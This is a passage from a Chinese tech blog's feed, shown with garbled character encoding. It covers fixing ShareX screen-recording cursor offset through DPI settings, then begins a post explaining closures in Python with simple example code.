link"><a class="link-card" title="ä¸€ä¸ªè½¯ä»¶ï¼Œæ»¡è¶³ä½ æ‰€æœ‰çš„æˆªå›¾éœ€æ±‚" href="https://sspai.com/post/43937"><div class="left"><img src="https://cdn-static.sspai.com/favicon/sspai.ico" class="lazyload" data-srcset="https://cdn-static.sspai.com/favicon/sspai.ico" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">ä¸€ä¸ªè½¯ä»¶ï¼Œæ»¡è¶³ä½ æ‰€æœ‰çš„æˆªå›¾éœ€æ±‚</p><p class="url">https://sspai.com/post/43937</p></div></a></div><p>å½“ç„¶ï¼Œæ²¡æœ‰ä¸€ä¸ªè½¯ä»¶æ˜¯å®Œç¾çš„ã€‚æˆ‘ä½¿ç”¨çš„æ˜¯å†™ä¸‹æ­¤æ–‡æ—¶ShareXæœ€æ–°ç‰ˆæœ¬14.1ï¼ŒæŒ‰ç…§å½•å±é»˜è®¤é…ç½®ï¼Œåœ¨ä½¿ç”¨ShareXå½•å±æ—¶ï¼Œäº§ç”Ÿäº†å…‰æ ‡ä½ç½®åç§»çš„é—®é¢˜ï¼š</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2022/12/03/638b4ede1af75.gif" data-fancybox="default" data-caption="é—®é¢˜æ¼”ç¤º"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2022/12/03/638b4ede1af75.gif" class="lazyload" data-srcset="https://bu.dusays.com/2022/12/03/638b4ede1af75.gif" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="é—®é¢˜æ¼”ç¤º"></a><span class="image-caption">é—®é¢˜æ¼”ç¤º</span></div></div><h2 id="é—®é¢˜èµ·å› "><a href="#é—®é¢˜èµ·å› " class="headerlink" title="é—®é¢˜èµ·å› "></a>é—®é¢˜èµ·å› </h2><p>ShareXçš„å±å¹•æ•æ‰å™¨è§†é¢‘æºé»˜è®¤ä½¿ç”¨<a href="https://github.com/rdp/screen-capture-recorder-to-video-windows-free">screen-capture-recorder</a>ï¼Œåœ¨ä½¿ç”¨è¯¥è§†é¢‘æºå½•å±æ—¶ï¼Œå¯¹å±å¹•çš„ç¼©æ”¾æœ‰ä¸¥æ ¼è¦æ±‚ï¼Œå¦åˆ™å°±ä¼šå‡ºç°å…‰æ ‡åç§»çš„é—®é¢˜ã€‚</p><p>å…ˆæ£€æŸ¥ä½ çš„è§†é¢‘æºæ˜¯å¦ä½¿ç”¨<a href="https://github.com/rdp/screen-capture-recorder-to-video-windows-free">screen-capture-recorder</a>ï¼Œç‚¹å‡»<code>åŠ¨ä½œè®¾ç½®-&gt;å±å¹•å½•åˆ¶-&gt;å±å¹•å½•åˆ¶é€‰é¡¹</code>ï¼Œè‹¥åœ¨<code>4</code>æ‰€æŒ‡ä¹‹å¤„ï¼Œä½ çš„é€‰æ‹©å’Œå›¾ä¸­ä¸€è‡´ï¼Œé‚£ä¹ˆæœ¬æ–‡æ‰€è®°å½•çš„è§£å†³æ–¹æ¡ˆåº”è¯¥é€‚åˆä½ ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2022/12/03/638b48c636e40.png" data-fancybox="default" data-caption="æ£€æŸ¥"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2022/12/03/638b48c636e40.png" class="lazyload" data-srcset="https://bu.dusays.com/2022/12/03/638b48c636e40.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="æ£€æŸ¥"></a><span class="image-caption">æ£€æŸ¥</span></div></div><h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><p>æˆ‘çš„ç”µè„‘ç³»ç»Ÿç‰ˆæœ¬æ˜¯Win11 22H2ï¼Œåœ¨å…¶ä»–windowsç³»ç»Ÿä¸‹çš„é…ç½®ç•¥æœ‰ä¸åŒä½†å¤§ä½“ä¸€è‡´ã€‚</p><h3 id="è§£å†³æ–¹æ¡ˆ1ï¼ˆä¸æ¨èï¼‰"><a href="#è§£å†³æ–¹æ¡ˆ1ï¼ˆä¸æ¨èï¼‰" class="headerlink" title="è§£å†³æ–¹æ¡ˆ1ï¼ˆä¸æ¨èï¼‰"></a>è§£å†³æ–¹æ¡ˆ1ï¼ˆä¸æ¨èï¼‰</h3><p>æ‰“å¼€ç³»ç»Ÿè®¾ç½®ï¼Œæ‰¾åˆ°<code>å±å¹•-&gt;ç¼©æ”¾å’Œå¸ƒå±€-&gt;ç¼©æ”¾</code>ï¼Œæ›´æ”¹ä¸º100%ã€‚è¿™æ ·åšååˆ†å½±å“å±å¹•çš„æ˜¾ç¤ºæ•ˆæœï¼Œå°¤å…¶æ˜¯åœ¨å¤§å°ºå¯¸å±å¹•ä¸Šï¼Œå› æ­¤å¹¶ä¸æ¨èã€‚</p><h3 id="è§£å†³æ–¹æ¡ˆ2"><a href="#è§£å†³æ–¹æ¡ˆ2" class="headerlink" title="è§£å†³æ–¹æ¡ˆ2"></a>è§£å†³æ–¹æ¡ˆ2</h3><p>å›åˆ°ShareXä¸­<code>å±å¹•å½•åˆ¶é€‰é¡¹</code>ç•Œé¢ï¼Œå°†è§†é¢‘æºæ”¹ä¸º<code>GDI grab</code>ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2022/12/03/638b4990112ef.png" data-fancybox="default" data-caption="æ›´æ”¹è§†é¢‘æº"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2022/12/03/638b4990112ef.png" class="lazyload" data-srcset="https://bu.dusays.com/2022/12/03/638b4990112ef.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="æ›´æ”¹è§†é¢‘æº"></a><span class="image-caption">æ›´æ”¹è§†é¢‘æº</span></div></div><h3 id="è§£å†³æ–¹æ¡ˆ3ï¼ˆæ¨èï¼‰"><a href="#è§£å†³æ–¹æ¡ˆ3ï¼ˆæ¨èï¼‰" class="headerlink" title="è§£å†³æ–¹æ¡ˆ3ï¼ˆæ¨èï¼‰"></a>è§£å†³æ–¹æ¡ˆ3ï¼ˆæ¨èï¼‰</h3><p>æ‰¾åˆ°ä½ çš„ShareXå®‰è£…ç›®å½•ï¼Œå³é”®ç‚¹å‡»<code>ShareX.exe</code>ï¼Œé€‰æ‹©<code>å±æ€§-&gt;å…¼å®¹æ€§-&gt;æ›´æ”¹é«˜DPIè®¾ç½®</code>ï¼Œå‹¾é€‰<code>æ›¿ä»£é«˜DPIç¼©æ”¾è¡Œä¸º</code>ï¼Œ<code>ç¼©æ”¾æ‰§è¡Œ</code>é€‰æ‹©<code>åº”ç”¨ç¨‹åº</code>ã€‚å¦‚æœä½ ä½¿ç”¨å¤šWindowsç”¨æˆ·ï¼Œå¹¶æƒ³ä¸ºæ‰€æœ‰ç”¨æˆ·è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¯·ç‚¹å‡»å›¾ç¤ºç¬¬4æ­¥ä¸‹æ–¹çš„<code>æ›´æ”¹æ‰€æœ‰ç”¨æˆ·çš„è®¾ç½®</code>ï¼Œå¹¶è¿›è¡Œç›¸åº”çš„è®¾ç½®ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2022/12/03/638b4a0a3b26d.png" data-fancybox="default" data-caption="å±æ€§é…ç½®"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2022/12/03/638b4a0a3b26d.png" class="lazyload" data-srcset="https://bu.dusays.com/2022/12/03/638b4a0a3b26d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å±æ€§é…ç½®"></a><span class="image-caption">å±æ€§é…ç½®</span></div></div><h2 id="3ç§æ–¹æ¡ˆå¯¹æ¯”"><a href="#3ç§æ–¹æ¡ˆå¯¹æ¯”" class="headerlink" title="3ç§æ–¹æ¡ˆå¯¹æ¯”"></a>3ç§æ–¹æ¡ˆå¯¹æ¯”</h2><ul><li>æ–¹æ¡ˆ1<br>å¾ˆå¤§ç¨‹åº¦åœ°å½±å“å±å¹•æ˜¾ç¤ºã€å½±å“æ—¥å¸¸ä½¿ç”¨</li><li>æ–¹æ¡ˆ2<br>å¯ä»¥å¾ˆå¥½åœ°è§£å†³é—®é¢˜ï¼Œä½†æ˜¯å½•åˆ¶æ•ˆæœä¸å¦‚æ–¹æ¡ˆ3ï¼Œå½•åˆ¶è¿‡ç¨‹ä¸­å…‰æ ‡å¶æœ‰é—ªçƒ</li><li>æ–¹æ¡ˆ3<br>ä¸æ›´æ”¹åŸæœ¬çš„å±å¹•ç¼©æ”¾æ¯”ä¾‹ï¼Œå½•åˆ¶æ•ˆæœå¥½</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;ShareXæ˜¯æˆ‘çš„ä¸»åŠ›æˆªå›¾å·¥å…·ï¼Œå› ä¸ºå®ƒå¼€æºä¸”åŠŸèƒ½å¼ºå¤§ã€‚ä½†æ˜¯å®é™…ä½¿ç”¨æ—¶ï¼Œå…¶å½•å±åŠŸèƒ½ä¼šå‡ºç°å…‰æ ‡æ˜¾ç¤ºä½ç½®ä¸å®é™…ä½ç½®å­˜åœ¨åç§»çš„é—®é¢˜ï¼Œè¿™ååˆ†å½±å“ä½¿ç”¨ä½“éªŒï¼Œé€šè¿‡æœç´¢è½¯ä»¶ä»“åº“issuesç­‰æ–¹å¼ï¼Œæˆ‘æ€»ç»“äº†è§£å†³è¿™ä¸€é—®é¢˜çš„æ–¹æ³•ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="è½¯ä»¶" scheme="https://blog.beacox.space/categories/%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="æ‚ä¸ƒæ‚å…«" scheme="https://blog.beacox.space/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    <category term="ShareX" scheme="https://blog.beacox.space/tags/ShareX/"/>
    
  </entry>
  
  <entry>
    <title>è°ˆè°ˆé—­åŒ…</title>
    <link href="https://blog.beacox.space/posts/closure/"/>
    <id>https://blog.beacox.space/posts/closure/</id>
    <published>2022-11-10T13:43:11.000Z</published>
    <updated>2022-11-10T13:43:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨å­¦ä¹ JSçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘é‡åˆ°äº†é—­åŒ…è¿™ä¸ªæ¦‚å¿µï¼Œå½“æ—¶å¹¶æ²¡æœ‰åœ¨æ„ã€‚ç›´åˆ°æœ€è¿‘æˆ‘å¼€å§‹è‡ªå­¦pythonï¼Œåœ¨å»–é›ªå³°è€å¸ˆçš„pythonæ•™ç¨‹ä¸­åˆä¸€æ¬¡çœ‹åˆ°äº†è¿™ä¸ªåè¯ï¼Œæˆ‘æ‰æ„è¯†åˆ°é—­åŒ…å…¶å®æ˜¯ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µï¼Œæˆ–è€…è¯´ç‰¹æ€§ï¼Œè®¸å¤šé«˜çº§è¯­è¨€æ”¯æŒé—­åŒ…ï¼ˆæ¯”å¦‚è¿‘äº›å¹´æ¯”è¾ƒç«çš„Goè¯­è¨€ï¼‰ã€‚äºæ˜¯æˆ‘æŸ¥çœ‹äº†ç›¸å…³æ–‡æ¡£ã€æ•™ç¨‹ï¼Œæ‰“ç®—è°ˆè°ˆæˆ‘å¯¹é—­åŒ…çš„ä¸€äº›è®¤è¯†ã€‚<span id="more"></span></p><h2 id="é—­åŒ…çš„å®šä¹‰"><a href="#é—­åŒ…çš„å®šä¹‰" class="headerlink" title="é—­åŒ…çš„å®šä¹‰"></a>é—­åŒ…çš„å®šä¹‰</h2><p>é—­åŒ…æœ‰è®¸å¤šä¸åŒçš„å®šä¹‰ï¼Œä¸ªäººè®¤ä¸ºæœ€ç®€æ´è€Œè¾¾æ„çš„æ˜¯<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures#%E9%97%AD%E5%8C%85">MDN</a>å¯¹äºé—­åŒ…çš„å®šä¹‰ï¼š</p><blockquote><p><strong>é—­åŒ…</strong>ï¼ˆclosureï¼‰æ˜¯ä¸€ä¸ªå‡½æ•°ä»¥åŠå…¶æ†ç»‘çš„å‘¨è¾¹ç¯å¢ƒçŠ¶æ€ï¼ˆ<strong>lexical environment</strong>ï¼Œ<strong>è¯æ³•ç¯å¢ƒ</strong>ï¼‰çš„å¼•ç”¨çš„ç»„åˆã€‚æ¢è€Œè¨€ä¹‹ï¼Œé—­åŒ…è®©å¼€å‘è€…å¯ä»¥ä»å†…éƒ¨å‡½æ•°è®¿é—®å¤–éƒ¨å‡½æ•°çš„ä½œç”¨åŸŸã€‚</p></blockquote><h2 id="è¯æ³•ç¯å¢ƒ"><a href="#è¯æ³•ç¯å¢ƒ" class="headerlink" title="è¯æ³•ç¯å¢ƒ"></a>è¯æ³•ç¯å¢ƒ</h2><p>ç»´åŸºç™¾ç§‘è¿™æ ·æè¿°é—­åŒ…ä¸­çš„è¯æ³•ç¯å¢ƒï¼š</p><blockquote><p>ç¯å¢ƒé‡Œæ˜¯è‹¥å¹²å¯¹ç¬¦å·å’Œå€¼çš„å¯¹åº”å…³ç³»ï¼Œå®ƒæ—¢è¦åŒ…æ‹¬<a href="https://zh.wikipedia.org/wiki/%E7%BA%A6%E6%9D%9F%E5%8F%98%E9%87%8F">çº¦æŸå˜é‡</a>ï¼ˆè¯¥å‡½æ•°å†…éƒ¨ç»‘å®šçš„ç¬¦å·ï¼‰ï¼Œä¹Ÿè¦åŒ…æ‹¬<a href="https://zh.wikipedia.org/wiki/%E8%87%AA%E7%94%B1%E5%8F%98%E9%87%8F">è‡ªç”±å˜é‡</a>ï¼ˆåœ¨å‡½æ•°å¤–éƒ¨å®šä¹‰ä½†åœ¨å‡½æ•°å†…è¢«å¼•ç”¨ï¼‰ï¼Œæœ‰äº›å‡½æ•°ä¹Ÿå¯èƒ½æ²¡æœ‰è‡ªç”±å˜é‡ã€‚</p></blockquote><p>ç®€å•æ¥è¯´ï¼Œè¯æ³•ç¯å¢ƒåŒ…å«ä¸¤éƒ¨åˆ†ï¼š</p><ul><li>ç¯å¢ƒè®°å½•ï¼šå­˜å‚¨ç¬¦å·-å€¼å¯¹</li><li>å¯¹å¤–éƒ¨ç¯å¢ƒçš„å¼•ç”¨ï¼šå¯¹çˆ¶çº§è¯æ³•ç¯å¢ƒçš„å¼•ç”¨ã€‚</li></ul><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªå‡½æ•°çš„è¯æ³•ç¯å¢ƒåŒ…å«äº†åœ¨å‡½æ•°ä¸­çš„ç¬¦å·å®šä¹‰å’Œå‡½æ•°å¤–éƒ¨çš„è¯æ³•ç¯å¢ƒã€‚è€ƒè™‘å¦‚ä¸‹pythonä»£ç ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    name = <span class="string">"BeaCox"</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">displayName</span>():</span><br><span class="line">        greeting = <span class="string">"Hello"</span></span><br><span class="line">        <span class="built_in">print</span>(greeting+<span class="string">', '</span>+name)</span><br><span class="line">    displayName()</span><br><span class="line">init()</span><br></pre></td></tr></tbody></table></figure><p><code>displayName</code>å‡½æ•°çš„è¯æ³•ç¯å¢ƒåŒ…å«äº†ç¯å¢ƒè®°å½•ï¼ˆ<code>greeting</code>çš„ç¬¦å·-å€¼å¯¹ï¼‰ä»¥åŠå¯¹å¤–éƒ¨ç¯å¢ƒçš„å¼•ç”¨ï¼ˆ<code>name</code>å’Œ<code>displayName</code>çš„ç¬¦å·-å€¼å¯¹ï¼‰ï¼Œè¿™ä¹Ÿå°±æ˜¯åœ¨<code>displayName</code>å‡½æ•°ä¸­å¯ä»¥è®¿é—®<code>name</code>å˜é‡çš„åŸå› ã€‚æ‰§è¡Œ<code>displayName</code>å‡½æ•°ï¼Œå…¶å®å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªé—­åŒ…ã€‚</p><h2 id="ä½¿ç”¨é—­åŒ…"><a href="#ä½¿ç”¨é—­åŒ…" class="headerlink" title="ä½¿ç”¨é—­åŒ…"></a>ä½¿ç”¨é—­åŒ…</h2><p>çœ‹å®Œä¸Šé¢çš„ä¾‹å­ï¼Œå¥½åƒæœ‰ç‚¹è¿·ç³Šäº†ï¼šè¿™ä¸å°±æ˜¯â€œå†…å±‚ä½œç”¨åŸŸå¯ä»¥è®¿é—®å¤–å±‚ä½œç”¨åŸŸçš„å˜é‡â€å—ï¼ŸC++ä¸æ”¯æŒé—­åŒ…ï¼Œä¸ä¹Ÿèƒ½å®Œæˆä¸Šé¢çš„å·¥ä½œå—ï¼Ÿè¿™æ˜¯å› ä¸ºä¸Šé¢çš„ä¾‹å­å¹¶æ²¡æœ‰å±•ç¤ºå‡ºé—­åŒ…å‡½æ•°ä¸è¯æ³•ç¯å¢ƒ<strong>æ†ç»‘</strong>çš„ç‰¹æ€§ã€‚å°†ä¸Šé¢çš„ä»£ç ç¨åŠ æ”¹åŠ¨ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    name = <span class="string">"BeaCox"</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">displayName</span>():</span><br><span class="line">        greeting = <span class="string">"Hello"</span></span><br><span class="line">        <span class="built_in">print</span>(greeting+<span class="string">', '</span>+name)</span><br><span class="line">    <span class="keyword">return</span> displayName</span><br><span class="line">outsideDisplay=init()</span><br><span class="line">outsideDisplay()</span><br></pre></td></tr></tbody></table></figure><p>è¿™æ®µä»£ç ä¸ä¸Šé¢ä¸åŒçš„åœ°æ–¹åœ¨äºï¼Œ<code>displayName</code>å‡½æ•°å¹¶ä¸åœ¨<code>init</code>å‡½æ•°ä¸­æ‰§è¡Œï¼Œè€Œæ˜¯ä½œä¸ºè¿”å›å€¼ï¼Œåœ¨<code>init</code>å‡½æ•°å¤–éƒ¨ï¼Œæœ‰ä¸€ä¸ª<code>outsideDisplay</code>æ¥æ”¶äº†è¿™ä¸ªè¿”å›å€¼ã€‚<br>å¦‚æœæˆ‘ä»¬ä»C++çš„æ€æƒ³æ¥è€ƒè™‘è¿™æ®µä»£ç ï¼Œä¼šå‘ç°ï¼šåœ¨<code>init</code>å‡½æ•°æ‰§è¡Œå®Œåï¼Œå±€éƒ¨å˜é‡<code>name</code>å·²ç»è¢«å›æ”¶ï¼Œè¿™æ—¶å€™<code>outsideDisplay</code>ä¸­<code>name</code>å˜é‡æ˜¯æ²¡æœ‰è¢«å®šä¹‰çš„ï¼Œè¿™æ®µä»£ç åº”è¯¥ä¸èƒ½æ­£å¸¸è¿è¡Œã€‚<br>ç„¶è€Œï¼Œæˆ‘ä»¬è¿è¡Œè¿™æ®µpythonç¨‹åºåä¼šå‘ç°ï¼Œç»ˆç«¯æ­£å¸¸è¾“å‡º<code>Hello, BeaCox</code>ï¼Œè¿™å°±æ˜¯é—­åŒ…çš„é­”åŠ›ï¼</p><p>è¿™æ®µç¨‹åºä¹‹æ‰€ä»¥æ­£å¸¸è¿è¡Œçš„åŸå› ï¼Œå°±æ˜¯<code>python</code>ä¸­è¿”å›å‡½æ•°ä¼šå½¢æˆé—­åŒ…ã€‚é—­åŒ…æ˜¯ç”±å‡½æ•°ä»¥åŠå£°æ˜è¯¥å‡½æ•°çš„è¯æ³•ç¯å¢ƒç»„åˆè€Œæˆçš„ã€‚è¯¥ç¯å¢ƒåŒ…å«äº†è¿™ä¸ªé—­åŒ…åˆ›å»ºæ—¶ä½œç”¨åŸŸå†…çš„ä»»ä½•å±€éƒ¨å˜é‡ã€‚åœ¨æœ¬ä¾‹å­ä¸­ï¼Œ<code>outsideDisplay</code> æ˜¯æ‰§è¡Œ <code>init</code> æ—¶åˆ›å»ºçš„ <code>displayName</code> å‡½æ•°å®ä¾‹çš„å¼•ç”¨ã€‚<code>displayName</code> å‡½æ•°å’Œå…¶æ†ç»‘çš„<strong>è¯æ³•ç¯å¢ƒ</strong>ï¼ˆå˜é‡ <code>name</code> å­˜åœ¨äºå…¶ä¸­ï¼‰çš„å¼•ç”¨å½¢æˆäº†ä¸€ä¸ªé—­åŒ…ï¼Œå› æ­¤<code>init</code>å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œè¯¥è¯æ³•ç¯å¢ƒæ²¡æœ‰æ¶ˆå¤±ï¼Œå˜é‡<code>name</code>ä¹Ÿæ²¡æœ‰è¢«å›æ”¶ã€‚å› æ­¤ï¼Œå½“ <code>outsideDisplay</code> è¢«è°ƒç”¨æ—¶ï¼Œå˜é‡ <code>name</code> ä»ç„¶å¯ç”¨ï¼Œç¨‹åºèƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p><h2 id="é—­åŒ…çš„ç”¨é€”"><a href="#é—­åŒ…çš„ç”¨é€”" class="headerlink" title="é—­åŒ…çš„ç”¨é€”"></a>é—­åŒ…çš„ç”¨é€”</h2><h3 id="æ¨¡æ‹Ÿå…¬æœ‰æˆå‘˜å‡½æ•°å¯¹ç§æœ‰å˜é‡çš„æ“ä½œ"><a href="#æ¨¡æ‹Ÿå…¬æœ‰æˆå‘˜å‡½æ•°å¯¹ç§æœ‰å˜é‡çš„æ“ä½œ" class="headerlink" title="æ¨¡æ‹Ÿå…¬æœ‰æˆå‘˜å‡½æ•°å¯¹ç§æœ‰å˜é‡çš„æ“ä½œ"></a>æ¨¡æ‹Ÿå…¬æœ‰æˆå‘˜å‡½æ•°å¯¹ç§æœ‰å˜é‡çš„æ“ä½œ</h3><p>è¯»å®Œä¸Šè¿°ä»£ç ä¸éš¾å‘ç°ï¼Œ<code>outsideDisplay</code>å‡½æ•°åœ¨<code>init</code>å‡½æ•°å¤–éƒ¨è°ƒç”¨ï¼Œä½†å´è®¿é—®åˆ°äº†<code>init</code>å‡½æ•°å†…éƒ¨çš„å˜é‡ã€‚è¿™ä¸C++ä¸­ï¼Œè°ƒç”¨ç±»çš„å…¬æœ‰æˆå‘˜å‡½æ•°æ¥æ“ä½œç±»çš„ç§æœ‰å˜é‡éå¸¸ç›¸ä¼¼ã€‚ä¸C++ä¸åŒï¼Œpythonä¸å­˜åœ¨ä¸¥æ ¼æ„ä¹‰ä¸Šçš„ç§æœ‰å˜é‡ï¼Œpythoné€šè¿‡ä»¥åŒä¸‹åˆ’çº¿ä¸ºå¼€å¤´æ¥å‘½åå˜é‡çš„æ–¹å¼ï¼Œå®ç°çš„æ˜¯ä¸€ç§ä¼ªç§æœ‰å˜é‡ï¼Œå®ƒ<strong>ä¸åº”è¯¥</strong>è¢«ä»å¤–éƒ¨è®¿é—®ï¼Œè€Œä¸æ˜¯<strong>ä¸èƒ½</strong>è¢«ä»å¤–éƒ¨è®¿é—®ã€‚pythonã€JavaScriptç­‰ä¸æ”¯æŒä¸¥æ ¼ç§æœ‰å˜é‡çš„è¯­è¨€å¯ä»¥é€šè¿‡åˆ›å»ºé—­åŒ…æ¥æ¨¡æ‹Ÿå…¬æœ‰æˆå‘˜å‡½æ•°å¯¹ç§æœ‰å˜é‡çš„æ“ä½œ</p><h3 id="åˆ›å»ºä¸€ä¸ªç”Ÿå‘½å‘¨æœŸæé•¿çš„å±€éƒ¨å˜é‡"><a href="#åˆ›å»ºä¸€ä¸ªç”Ÿå‘½å‘¨æœŸæé•¿çš„å±€éƒ¨å˜é‡" class="headerlink" title="åˆ›å»ºä¸€ä¸ªç”Ÿå‘½å‘¨æœŸæé•¿çš„å±€éƒ¨å˜é‡"></a>åˆ›å»ºä¸€ä¸ªç”Ÿå‘½å‘¨æœŸæé•¿çš„å±€éƒ¨å˜é‡</h3><p>è§‚å¯Ÿä¸Šè¿°ä¾‹å­ï¼Œ<code>outsideDisplay</code>å‡½æ•°å¯ä»¥ç»§ç»­é‡å¤è¿è¡Œï¼Œç›´åˆ°æ•´ä¸ªç¨‹åºç»ˆæ­¢ã€‚ä¹Ÿå°±æ˜¯è¯´<code>name</code>å˜é‡ç›´åˆ°ç¨‹åºè¿è¡Œç»“æŸä¹‹å‰ï¼Œéƒ½ä¸€ç›´å­˜åœ¨äºå†…å­˜ä¸­ã€‚å¬èµ·æ¥è²Œä¼¼å¾ˆåƒå…¨å±€å˜é‡ï¼Œä½†è¿™ä¸ªå˜é‡å´æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ã€‚ä»…è¿™ä¸ªç¨‹åºè€Œè¨€ï¼Œè¿™ä¸ªå˜é‡åªèƒ½è¢«<code>outsideDisplay</code>å‡½æ•°å’Œ<code>init</code>å‡½æ•°è®¿é—®ã€‚</p><h2 id="é—­åŒ…å¯èƒ½å¯¼è‡´çš„é—®é¢˜"><a href="#é—­åŒ…å¯èƒ½å¯¼è‡´çš„é—®é¢˜" class="headerlink" title="é—­åŒ…å¯èƒ½å¯¼è‡´çš„é—®é¢˜"></a>é—­åŒ…å¯èƒ½å¯¼è‡´çš„é—®é¢˜</h2><h3 id="å†…å­˜æ³„æ¼"><a href="#å†…å­˜æ³„æ¼" class="headerlink" title="å†…å­˜æ³„æ¼"></a>å†…å­˜æ³„æ¼</h3><blockquote><p> <em>å†…å­˜æ³„æ¼</em>ï¼ˆMemory Leakï¼‰æ˜¯æŒ‡ç¨‹åºä¸­å·²åŠ¨æ€åˆ†é…çš„å †å†…å­˜ç”±äºæŸç§åŸå› ç¨‹åºæœªé‡Šæ”¾æˆ–æ— æ³•é‡Šæ”¾ï¼Œé€ æˆç³»ç»Ÿå†…å­˜çš„æµªè´¹ï¼Œå¯¼è‡´ç¨‹åºè¿è¡Œé€Ÿåº¦å‡æ…¢ç”šè‡³ç³»ç»Ÿå´©æºƒç­‰ä¸¥é‡åæœã€‚</p></blockquote><p>ä¸Šæ–‡æåˆ°ï¼Œé—­åŒ…å¯ä»¥åˆ›å»ºä¸€ä¸ªç”Ÿå‘½å‘¨æœŸæé•¿ï¼ˆç›´åˆ°ç¨‹åºè¿è¡Œç»“æŸå‰å§‹ç»ˆç•™å­˜åœ¨å†…å­˜ä¸­ï¼‰çš„å˜é‡ï¼Œå¦‚æœè¿™æ ·çš„å˜é‡è¿‡å¤šï¼Œå°±ä¼šå¯¼è‡´ç¨‹åºè¿è¡Œé€Ÿåº¦å‡æ…¢ç”šè‡³ç³»ç»Ÿå´©æºƒã€‚</p><h3 id="åœ¨å¾ªç¯ä¸­åˆ›å»ºé—­åŒ…å¯¼è‡´æ„æ–™ä¹‹å¤–çš„é”™è¯¯"><a href="#åœ¨å¾ªç¯ä¸­åˆ›å»ºé—­åŒ…å¯¼è‡´æ„æ–™ä¹‹å¤–çš„é”™è¯¯" class="headerlink" title="åœ¨å¾ªç¯ä¸­åˆ›å»ºé—­åŒ…å¯¼è‡´æ„æ–™ä¹‹å¤–çš„é”™è¯¯"></a>åœ¨å¾ªç¯ä¸­åˆ›å»ºé—­åŒ…å¯¼è‡´æ„æ–™ä¹‹å¤–çš„é”™è¯¯</h3><p>å»–é›ªå³°è€å¸ˆçš„pythonæ•™ç¨‹ä¸­ç»™å‡ºäº†ä¸€ä¸ªè¿™æ ·çš„ä¾‹å­ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">count</span>():</span><br><span class="line">    fs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>)://iä»<span class="number">1</span>åˆ°<span class="number">3</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">             <span class="keyword">return</span> i*i</span><br><span class="line">        fs.append(f)</span><br><span class="line">    <span class="keyword">return</span> fs</span><br><span class="line"></span><br><span class="line">f1, f2, f3 = count()</span><br></pre></td></tr></tbody></table></figure><p>è¿™æ®µç¨‹åºçš„æœŸæœ›ç›®æ ‡æ˜¯f1, f2, f3åˆ†åˆ«è¿”å›1ï¼Œ4ï¼Œ9ã€‚å®é™…è¿”å›9, 9, 9ã€‚è¿™æ˜¯å› 